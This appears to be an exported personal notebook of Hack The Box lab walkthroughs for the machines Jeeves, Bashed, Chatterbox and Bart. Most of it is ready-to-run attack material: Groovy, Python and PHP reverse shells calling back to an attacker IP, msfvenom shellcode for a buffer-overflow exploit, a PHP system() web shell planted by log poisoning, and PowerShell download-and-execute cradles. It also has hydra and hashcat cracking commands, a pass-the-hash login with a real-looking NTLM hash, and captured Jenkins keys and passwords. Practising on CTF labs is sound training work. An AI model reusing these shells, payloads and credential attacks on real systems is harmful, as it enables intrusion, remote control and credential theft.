class='page'><h1 class='title level-5'>flags</h1><br/>user<br />    e3232272596fb47950d59c4cf1e7066a<br />root<br />    afbc5bd4b615a60648cec41c6ac92530</div><div class='page'><h1 class='title level-4'>10.10.10.63 Jeeves2</h1><br/>nmap showed that 80, 135, 445, 50000 were open.<br />Dirsearch showed that 50000 had the dir /askjeeves/<br />when you navigated to /askjeeves/ you were already logged in as some kind of user!<br />&gt;manage jenkins&gt;script console let you execute groovy code!<br />reverse shell just that easy!<br />user.txt!<br /><br />used smbserver.py to create a smbserver and connected to it on the windows machine.<br />PowerUp.ps1 is dead. HarmJoy&#39;s greatest embarassment.<br />Jaws and winPEAS both pointed out with flare that there was a kdbx file in kohsuke /documents<br />put the kdbx file in the smb share to get it on the kali.<br />keepass2john to get a hash<br />remove the CEH: piece and put it on a text file on the local computer to run against hashcat<br />look up the hash type on the hashcat example hashes website (13400)<br />hashcat64.exe -m 13400 yeet\jeeves2.txt yeet\rockyou.txt<br />GotIt! moonshine1<br />using keepass2 on kali use the password to open the kdbx file.<br />got a hash for administrator!<br />useing pth-winexe I was able to log in as administrator!!<br /><br />pth-winexe -U jenkins/administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd.exe<br /><br />The administrator desktop directory had a hm.txt instead of a root.txt. the hm.txt said to look deeper.<br />dir -r was not showing me anything so I used invoke-powershelltcp.ps1 to get a powershell shell so I could run powershell commands<br /><br />get-content hm.txt -stream root.txt         did the trick!! <br />rooted.</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>type secret.key<br />58d05496da2496d09036d36c99b56f1e89cc662f3e65a4023de71de7e1df8afb<br />type master.key<br />40e19a08d55698273e82182aae560bb78f5c99205e1b603de13e4729dfeed0bfaa9ed79557107ca7294a8a18a9bd81d60ee5610943e488bf2150dc1b06935b8f2a4f5b9370e0cb1d28249758e2b96cf2b658f2c5290fc6a202d9a04621c79eb0d09faf3246e50998a0aaea42b76eb96186f4842e0f9c07bbbd77152afc59de16<br />C:\Users\Administrator\.jenkins\secrets&gt;type hudson.util.secret<br />type hudson.util.secret<br />׶<br /> hf��@�A�o�R����M��*R��S�I[ciޫl�����h��m\_��U����Πb�{x�b�=BiiP�N�O#b�GP=��`����j�x~·%��7�Z{i�C�C򗝋�	�jh���`�n��F�A�7��D�7$�q`�&lt;���w^��&quot;��!����A�be���<br />n&lt;�G�f�{�;�B����U���@|���p�I���Qp��sfD�f=�^XD��󔘢b^�5�܏�\�$L������MӜJ                                                                                      ���莉�{}����<br /><br /><br />powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File .\PowerUp.ps1</div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=127e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping;">http://www.kellyodonnell.com/content/determining-os-type-ping;</a> nmap 10.10.10.63<br />ttl=127<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-02 09:36 EDT<br />Nmap scan report for 10.10.10.63<br />Host is up (0.25s latency).<br />Not shown: 996 filtered ports<br />PORT      STATE SERVICE<br />80/tcp    open  http<br />135/tcp   open  msrpc<br />445/tcp   open  microsoft-ds<br />50000/tcp open  ibm-db2<br /><br />Nmap done: 1 IP address (1 host up) scanned in 19.75 seconds<br /></div><div class='page'><h1 class='title level-6'>nmap version</h1><br/>nmap -sC -sV 10.10.10.63<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-02 09:36 EDT<br />Nmap scan report for 10.10.10.63<br />Host is up (0.20s latency).<br />Not shown: 996 filtered ports<br />PORT      STATE SERVICE      VERSION<br />80/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br />|_http-server-header: Microsoft-IIS/10.0<br />|_http-title: Ask Jeeves<br />135/tcp   open  msrpc        Microsoft Windows RPC<br />445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)<br />50000/tcp open  http         Jetty 9.4.z-SNAPSHOT<br />|_http-server-header: Jetty(9.4.z-SNAPSHOT)<br />|_http-title: Error 404 Not Found<br />Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: mean: 4h59m55s, deviation: 1s, median: 4h59m54s<br />|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2020-04-02T18:36:50<br />|_  start_date: 2020-04-02T18:35:22<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 85.16 seconds<br />squid@CoolHandKali:/Yeet/Machines/HTB/Jeeves$ <br /></div><div class='page'><h1 class='title level-6'>web</h1><br/></div><div class='page'><h1 class='title level-7'>80</h1><br/></div><div class='page'><h1 class='title level-8'>nmap web</h1><br/>PORT   STATE SERVICE REASON  VERSION<br />80/tcp open  http    syn-ack Microsoft IIS httpd 10.0<br />|_http-server-header: Microsoft-IIS/10.0<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /></div><div class='page'><h1 class='title level-8'>dirsearch</h1><br/>python3 /Yeet/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://10.10.10.63:80">http://10.10.10.63:80</a> --simple-report dirsearchsimple_10.10.10.63:80<br /><br /> _|. _ _  _  _  _ _|_    v0.3.9<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /Yeet/Tools/dirsearch/logs/errors-20-04-02_09-37-02.log<br /><br />Target: <a href="http://10.10.10.63:80">http://10.10.10.63:80</a><br /><br />[09:37:06] Starting: <br />CTRL+C detected: Pausing threads, please wait...<br /><br />Canceled by the user<br />squid@CoolHandKali:/Yeet/Machines/HTB/Jeeves$ <br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-8'>nikto</h1><br/>nikto -host <a href="http://10.10.10.63:80">http://10.10.10.63:80</a> | tee nikto_10.10.10.63:80<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.10.10.63<br />+ Target Hostname:    10.10.10.63<br />+ Target Port:        80<br />+ Start Time:         2020-04-02 09:37:01 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Microsoft-IIS/10.0<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST <br />+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST <br />^Csquid@CoolHandKali:/Yeet/Machines/HTB/Jeeves$ <br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-7'>50000</h1><br/></div><div class='page'><h1 class='title level-8'>nmap web</h1><br/> STATE SERVICE REASON  VERSION<br />50000/tcp open  http    syn-ack Jetty 9.4.z-SNAPSHOT<br />|_http-server-header: Jetty(9.4.z-SNAPSHOT)<br /><br /></div><div class='page'><h1 class='title level-8'>nikto</h1><br/>nikto -host <a href="http://10.10.10.63:50000">http://10.10.10.63:50000</a> | tee nikto_10.10.10.63:50000<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.10.10.63<br />+ Target Hostname:    10.10.10.63<br />+ Target Port:        50000<br />+ Start Time:         2020-04-02 09:37:03 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Jetty(9.4.z-SNAPSHOT)<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />^Csquid@CoolHandKali:/Yeet/Machines/HTB/Jeeves$ <br /><br /><br /></div><div class='page'><h1 class='title level-8'>dirsearch</h1><br/>python3 /Yeet/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://10.10.10.63:50000">http://10.10.10.63:50000</a> --simple-report dirsearchsimple_10.10.10.63:50000<br /><br /> _|. _ _  _  _  _ _|_    v0.3.9<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /Yeet/Tools/dirsearch/logs/errors-20-04-02_09-37-02.log<br /><br />Target: <a href="http://10.10.10.63:50000">http://10.10.10.63:50000</a><br /><br />[09:37:03] Starting: <br />[09:59:36] 200 -   11KB - /askjeeves/<br />CTRL+C detected: Pausing threads, please wait...<br /><br />Canceled by the user<br />squid@CoolHandKali:/Yeet/Machines/HTB/Jeeves$ <br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/>user<br />e3232272596fb47950d59c4cf1e7066a<br />root<br />afbc5bd4b615a60648cec41c6ac92530</div><div class='page'><h1 class='title level-4'>10.10.10.63 Jeeves3</h1><br/></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>jetty 9.4.z<br />c:\webroot\Sock_Puppets\App_Code...<br />Windows NT 5.0 Build 2195<br />Windows 2000?<br /><br />50000 is running jenkins<br />Jenkins user admin<br /><br />cmd	= &quot;net user&quot;<br />println(cmd.execute().text)<br /><br /><br /><br />String host=&quot;10.10.14.60&quot;;<br />int port=3232;<br />String cmd=&quot;cmd.exe&quot;;<br />Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();<br /><br /><br />Windows 10</div><div class='page'><h1 class='title level-6'>nmap</h1><br/></div><div class='page'><h1 class='title level-5'>flags</h1><br/></div><div class='page'><h1 class='title level-4'>10.10.10.68 Bashed</h1><br/>root@kali:~/Desktop/HTB/Bashed# nmap -sC -sV -oN 10.10.10.68.txt 10.10.10.68<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-07-10 20:08 EDT<br />Nmap scan report for 10.10.10.68<br />Host is up (0.19s latency).<br />Not shown: 999 closed ports<br />PORT   STATE SERVICE VERSION<br />80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br />|_http-server-header: Apache/2.4.18 (Ubuntu)<br />|_http-title: Arrexel&#39;s Development Site<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 12.12 seconds<br /><br /><a href="http://10.10.10.68/dev/phpbash.min.php">http://10.10.10.68/dev/phpbash.min.php</a><br />    cat to /home/Arrexel/user.txt<br />        &gt;user flag<br /><br />in target web shell<br />    cd /dev/shm (used for shared memory space)<br />    wget <a href="http://10.10.14.60:80/LinEnum.sh">http://10.10.14.60:80/LinEnum.sh</a><br />    sh ./LinEnum.sh<br />---------------------------------------------------------------<br />-e \e[00;33m[+] We can sudo without supplying a password!\e[00m<br />Matching Defaults entries for www-data on bashed:<br />    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br /><br />User www-data may run the following commands on bashed:<br />    (scriptmanager : scriptmanager) NOPASSWD: ALL<br />-e <br /><br />-e \e[00;31m[-] Accounts that have recently used sudo:\e[00m<br />/home/arrexel/.sudo_as_admin_successful<br />-e <br />-------------------------------------------------------------<br /><br />in terminal<br />    mv <a href="file:///usr/share/laudanum/php/php-reverse-shell.php">/usr/share/laudanum/php/php-reverse-shell.php</a> to local dir and edit ip and port<br />    start python web server<br /><br />in web terminal<br />    cd /dev/shm<br />    wget <a href="http://10.10.14.60:8000/reverse-shell-php.php">http://10.10.14.60:8000/reverse-shell-php.php</a><br />    mv to /var/www/html/uploads/shell.php<br /><br />in terminal<br />    start a nc listener<br />  <br />in web interface<br />    navigate to <a href="http://10.10.10.68/uploads/shell.php">http://10.10.10.68/uploads/shell.php</a><br />   <br />in termial<br />    shell should be spawned in terminal<br />    <code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;  </code><br />    <br />    sudo -u scriptmanager whoami<br />        scriptmanager<br />    sudo -u scriptmanager  bash<br />        scriptmanager bash shell<br />        <br />        COULD NOT VI PROPERLY (NO ARROW KEYS)<br />         <code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br />         export TERM=screen<br />         still sucks, fuck it<br />         <br /><code>import socket,subprocess,os<br />s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br />s.connect((&quot;10.10.14.60&quot;,3233))<br />os.dup2(s.fileno(),0)<br />os.dup2(s.fileno(),1)<br />os.dup2(s.fileno(),2)<br />p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])</code><br /><br />seperate shell<br />    nc -nlvp 3233<br />    at the top of the minute, enjoyed the shell!!!<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />from pentestmonkey download a php reverse shell script. edit to call back to Kali<br />host on /var/www/html<br />wget <a href="http://10.10.14.60:80/3232.php">http://10.10.14.60:80/3232.php</a><br /><br /><br /><br /><br /><br /><br /><br /><br />echo “<code>import socket,subprocess,os” &gt;&gt; test.py<br />echo “s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)” &gt;&gt; test.py<br />echo &quot;s.connect((\&quot;10.10.14.60\&quot;,3233))&quot; &gt;&gt; test.py<br />echo “os.dup2(s.fileno(),0)” &gt;&gt; test.py<br />echo “os.dup2(s.fileno(),1)” &gt;&gt; test.py<br />echo “os.dup2(s.fileno(),2)” &gt;&gt; test.py<br />echo &quot;p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;])</code>&quot; &gt;&gt; test.py<br /><br />echo &quot;<code>&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.10.14.60\&quot;,3233));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;</code>&quot; &gt; test.py </div><div class='page'><h1 class='title level-4'>10.10.10.74 Chatterbox</h1><br/>nmap showed that nothing was open<br />nmap -p- showed that 9255 and 9256 were open and running achat<br />searchsploit showed that achat was vulnerable to a BO<br />create shellcode for and edit BO 36025.py<br />run it with an nc listener running and get a reverse shell as alfred!<br />in basic windows enumeration <br />    reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; | findstr /isp &quot;password&quot;<br />    showed that the default password was “Welcome1!”<br />    <br />unfortunaley this machine is wildly unstable so I was not able to verify that this password would work for admin, so ippsec did that for me.<br /><br /><br /><br />also <br />    get-acl root.txt | fl *<br />    showed that root.txt was owned by alfred<br />        cacls root.txt /t /e /p Alfred:F<br />        gave alfred full permissions<br />aaaannnnddddd rooted!!!</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/><br />msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp lhost=10.10.14.60 lport=3232 -e x86/unicode_mixed -b &#39;\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&#39; BufferRegister=EAX -f python &gt; shellcode.txt<br /><br /><br /><br />C:\Windows\system32&gt;reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; | findstr /isp &quot;password&quot;<br />reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; | findstr /isp &quot;password&quot;<br />    PasswordExpiryWarning    REG_DWORD    0x5<br />    DefaultPassword    REG_SZ    Welcome1!<br /><br />squid@CoolHandKali:/Yeet/Machines/HTB/Chatterbox$ msfvenom -a x86 --platform Windows -p windows/exec CMD=powershell.exe -exec Bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;<a href="http://10.10.14.60:8080/3233power.ps1')"">http://10.10.14.60:8080/3233power.ps1&#39;)&quot;</a>  -e x86/unicode_mixed -b &#39;\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&#39; BufferRegister=EAX -f python<br /></div><div class='page'><h1 class='title level-6'>nmap all ports</h1><br/>squid@CoolHandKali:/Yeet/Machines/HTB/Chatterbox$ nmap -p9255,9256 -sV -sC -Pn 10.10.10.74<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-03-31 14:05 EDT<br />Nmap scan report for 10.10.10.74<br />Host is up (0.14s latency).<br /><br />PORT     STATE SERVICE VERSION<br />9255/tcp open  http    AChat chat system httpd<br />|_http-server-header: AChat<br />|_http-title: Site doesn&#39;t have a title.<br />9256/tcp open  achat   AChat chat system<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 10.15 seconds<br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/>user<br />72290246dfaedb1e3e3ac9d6fb306334<br />root<br />a673d1b1fa95c276c5ef2aa13d9dcc7c</div><div class='page'><h1 class='title level-4'>10.10.10.81 Bart</h1><br/>nmap showed only port 80 open.<br />as things showd up at added them to the /etc/hosts file<br />dirsearch showed me monitor, which forwarded me to monitor.bart.htb (added to hosts)<br />I needed a password so I was able to take the userlist that I created in the last step by looking at the website<br />I used cewl on the main page to create a password list from forum.bart.htb<br />csrf is being used on the webpage so I cheated and found the login was harvey potter<br />monitor.bart.htb showed me internal-01.bart.htb (added to hosts)<br />I was able to use tirefire&#39;s hydra and rockyou to get the username harvey and the password Password1 <br />!!!!!!!!!!!<br />much fuckery needed to be done to the end of the command becasue the error message would change depending on how long the password was<br />!!!!!!!!!!!<br />hydra -l harvey -P /root/Desktop/Tools/Wordlists/rockyou.txt internal-01.bart.htb http-post-form &#39;/simple_chat/login.php:uname=^USER^&amp;passwd=^PASS^&amp;submit=Login:Password&#39;<br />!!!!!!!!!!!<br />in the page source code I saw this directory was displayed<br /><a href="http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey">http://internal-01.bart.htb/log/log.php?filename=log.txt&amp;username=harvey</a><br />when i turn log.php into log.txt I can see that my useragent is being logged to this page<br />...smells like log poisoning!!!<br />replaced the user agent string with this bad boy...(in burp obviously)<br />    &lt;?php system($_REQUEST[&#39;YeetCannon&#39;]); ?&gt;<br />    and it took!<br />now to get some commandage<br /><a href="http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey&YeetCannon=whoami">http://internal-01.bart.htb/log/log.php?filename=log.txt&amp;username=harvey&amp;YeetCannon=whoami</a><br />responce!!<br />now lets get a shell<br /><a href="http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey&YeetCannon=powershell">http://internal-01.bart.htb/log/log.php?filename=log.txt&amp;username=harvey&amp;YeetCannon=powershell</a> -exec bypass &quot;iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.60:8000/ye3233.ps1&#39;)<br />SHELLLYYYYYYY<br />too bad It is a service account<br /><br />very first SA command<br />PS C:\inetpub\wwwroot\internal-01\log&gt;[environment]::Is64BitProcess<br />False<br />...Fuck<br />letst fix it by calling the sysnative powershell<br /><a href="http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey&YeetCannon=powershell">http://internal-01.bart.htb/log/log.php?filename=log.txt&amp;username=harvey&amp;YeetCannon=</a>C:\windows\sysnative\windowspowershell\v1.0\powershell.exe -exec bypass “iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.60:8000/ye3233.ps1&#39;)”<br />PS C:\inetpub\wwwroot\internal-01\log&gt;[environment]::Is64BitProcess<br />True<br />phewwwwwwwwwww<br /><br />a reg query showed me that there was a cleartext password being stored for autologin<br />reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; | findstr /isp &quot;password&quot; <br /><br />lets use these creds to conect to the local C$<br />net use x: \\localhost\c$ /user:administrator 3130438f31186fbaf962f407711faddb<br />x:<br />type users\administrator\desktop\root.txt<br />yeeeeee<br />type user\h.potter\user.txt<br />yeeeheee<br /></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>powershell -exec bypass &quot;iex(new-object net.webclient).downloadfile(&#39;<a href="http://10.10.14.60:8000/rp.exe',">http://10.10.14.60:8000/rp.exe&#39;,</a> &#39;C:\users\public\documents\rp.exe&#39;)&quot;<br /><br />hydra -l harvey -P /root/Desktop/Machines/HTB/Bart/words.txt internal-01.bart.htb http-post-form &#39;/simple_chat/login.php:uname=^USER^&amp;passwd=^PASS^&amp;submit=Login:Password&#39;<br /><br /><br />/log/log.php?filename=log.php&amp;username=harvey&amp;YeetCannon=C%3a\windows\sysnative\windowspowershell\v1.0\powershell.exe+-exec+bypass+&quot;iex(new-object+net.webclient).downloadstring(&#39;http%3a//10.10.14.60%3a8000/ye3233.ps1&#39;)&quot; HTTP/1.1<br /><br /><br />3130438f31186fbaf962f407711faddb<br /><br /><br /><br /><br /><code>$username = &quot;administrator&quot; ; $password = &quot;3130438f31186fbaf962f407711faddb&quot; ; $secstr = New-Object -TypeName System.Security.SecureString ; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)} ; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr</code><br /><br />start-process “C:\users\public\documents\3235.exe” -credential $cred<br />Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString(&#39;<a href="http://10.10.15.48:8083/shell.ps1')">http://10.10.14.60:8000/ye3234.ps1&#39;)</a> } -Credential $cred -Computer localhost<br /><br /><br /><br />$username = &quot;BART\Administrator&quot;<br />$password = &quot;3130438f31186fbaf962f407711faddb&quot;<br />$secstr = New-Object -TypeName System.Security.SecureString<br />$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}<br />$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr<br />Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString(&#39;<a href="http://10.10.15.48:8083/shell.ps1')">http://10.10.15.48:8083/shell.ps1&#39;)</a> } -Credential $cred -Computer localhost<br /><br /><br />net use x: \\localhost\c$ /user:administrator 3130438f31186fbaf962f407711faddb</div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=127e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping;">http://www.kellyodonnell.com/content/determining-os-type-ping;</a> nmap 10.10.10.81<br />ttl=127<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-12-20 10:59 EST<br />Nmap scan report for 10.10.10.81<br />Host is up (0.12s latency).<br />Not shown: 999 filtered ports<br />PORT   STATE SERVICE<br />80/tcp open  http<br /><br />Nmap done: 1 IP address (1 host up) scanned in 19.20 seconds<br /></div><div class='page'><h1 class='title level-6'>nmap long</h1><br/>nmap -sC -sV -p- 10.10.10.81<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-12-20 10:59 EST<br />Nmap scan report for 10.10.10.81<br />Host is up (0.14s latency).<br />Not shown: 65534 filtered ports<br />PORT   STATE SERVICE VERSION<br />80/tcp open  http    Microsoft IIS httpd 10.0<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />|_http-server-header: Microsoft-IIS/10.0<br />|_http-title: Did not follow redirect to <a href="http://forum.bart.htb/">http://forum.bart.htb/</a><br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 739.33 seconds<br />root@kali:~/Desktop/Machines/HTB/Bart# <br /></div><div class='page'><h1 class='title level-6'>http nmap</h1><br/>80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 10.0<br /></div><div class='page'><h1 class='title level-6'>nikto</h1><br/>nikto -host <a href="http://10.10.10.81:80">http://10.10.10.81:80</a> | tee nikto_10.10.10.81:80<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.10.10.81<br />+ Target Hostname:    10.10.10.81<br />+ Target Port:        80<br />+ Start Time:         2019-12-20 11:01:39 (GMT-5)<br />---------------------------------------------------------------------------<br />+ Server: Microsoft-IIS/10.0<br />+ Retrieved x-powered-by header: PHP/7.1.7<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ Root page / redirects to: <a href="http://forum.bart.htb/">http://forum.bart.htb/</a><br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST <br />+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST <br />+ OSVDB-3092: /forum/: This might be interesting...<br />+ OSVDB-3092: /mm/: This might be interesting... potential country code (Myanmar)<br />+ OSVDB-11709: /index.JSP: Sun ONE Application Server 7.0 for Windows 2000/XP allows remote attackers to obtain JSP source code via a request that uses the uppercase .JSP extension instead of the lowercase .jsp extension. (<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0411)">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0411)</a><br />+ 7504 requests: 0 error(s) and 9 item(s) reported on remote host<br />+ End Time:           2019-12-20 11:54:29 (GMT-5) (3170 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br />root@kali:~/Desktop/Machines/HTB/Bart# <br /></div><div class='page'><h1 class='title level-6'>dirsearch</h1><br/>python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://10.10.10.81:80">http://10.10.10.81:80</a> --simple-report dirsearchsimple_10.10.10.81:80<br /><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-12-20_20-10-13.log<br /><br />Target: <a href="http://10.10.10.81:80">http://10.10.10.81:80</a><br /><br />[20:10:14] Starting: <br />[20:10:27] 302 -    0B  - /index.php  -&gt;  <a href="http://forum.bart.htb/">http://forum.bart.htb/</a><br />[20:10:57] 200 -   35KB - /forum/<br />[20:16:17] 302 -    0B  - /Index.php  -&gt;  <a href="http://forum.bart.htb/">http://forum.bart.htb/</a><br />[20:24:44] 200 -    3KB - /monitor/<br />CTRL+C detected: Pausing threads, please wait...<br /><br />Canceled by the user<br /></div><div class='page'><h1 class='title 